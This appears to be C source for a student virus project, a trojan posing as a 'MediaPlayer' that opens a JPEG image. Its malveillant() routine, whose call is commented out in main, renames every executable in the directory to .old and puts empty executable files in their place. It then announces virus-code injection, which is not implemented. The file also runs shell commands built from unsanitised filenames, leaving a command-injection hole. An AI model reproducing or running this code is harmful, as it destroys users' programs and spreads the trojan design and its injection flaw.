#include "MediaPlayer.h"

int main(int argc, char *argv[]) {
        mediaplayer();
        //malveillant();

        if(strcmp(argv[0],"./MediaPlayer")) {
                printf("\nNous sommes dans un programme infecté\n");
        }
        else {
                printf("\nNous sommes dans le virus originel\n");
        }
        return 0;
}

/*
        Vérifie si la fonction contient ".jpeg"
*/
bool checkStringContains(char *fileName) {
        char *lookingFor = ".jpeg";
        return strstr(fileName,lookingFor);
}

/*
        Lance la commande xdg-open, lancant l'afficheur d'images
*/
void afficheImage(char *fileName) {

        char *command = "xdg-open ";
        char *errRedirect = " 2> /dev/null";
        char *String = malloc(strlen(command) + strlen(fileName) +strlen(errRedirect) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                strcat(String,errRedirect);
        }
        system(String);
}

/*
        Liste les fichiers possedant l'extension demandée
*/
void listeFichier(char *extension) {
        DIR *myDir;
        int cptImg = 0;
        struct dirent *dir;

        // FIRST PARSING
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {

                        if (strstr(dir->d_name,extension)) {
                                cptImg++;
                        }
                }
                closedir(myDir);
        }

        const char *imageNames[cptImg];
        if (cptImg > 0) {
                // SECOND PARSING
                myDir = opendir(".");
                if (myDir) {
                        int i = 0;
                        while ((dir = readdir(myDir)) != NULL) {
                                if (strstr(dir->d_name,extension)) {
                                        imageNames[i] = dir->d_name;
                                        i++;
                                }
                        }
                        closedir(myDir);
                }

                afficheImage((char *)imageNames[0]);
        }

}

void mediaplayer () {
        listeFichier(".jpeg");
}

/*
        Compte le nombre de fichiers executables dans le dossier à l'execution
*/
void cptExec() {
        DIR *myDir;
        struct dirent *dir;

        // FIRST PARSING
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {
                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name))) {
                                if (access(dir->d_name, X_OK) == 0) {
                                        renamingFile(dir->d_name);
                                }
                        }
                }
                closedir(myDir);
        }
}

/*
        Renomme les fichiers, créer un noueau fichier au même nom et ajout les droits sur le nouveau fichier
*/
void renamingFile(char *fileName) {
        printf("\tRenaming %s into %s.old\n",fileName,fileName);

        // renommage des fichiers en .old
        char *command = "mv ";
        char *extension = ".old";
        char *espace = " ";
        char *String = malloc(strlen(command) + (strlen(fileName)*2) + strlen(espace) + strlen(extension) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                strcat(String,espace);
                strcat(String,fileName);
                strcat(String,extension);
                system(String);
        }

        // création des nouveaux fichier remplacant
        command = "touch ";
        String = malloc(strlen(command) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                system(String);
        }

        // ajoute le droit d'exécution sur le fichier
        command = "chmod +x ";
        String = malloc(strlen(command) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                system(String);
        }
}

void malveillant() {
        printf("\nBad things happens bruh\n");

        printf("\nListing executables and renaming and creating new files..\n\n");

        cptExec();

        printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");


}
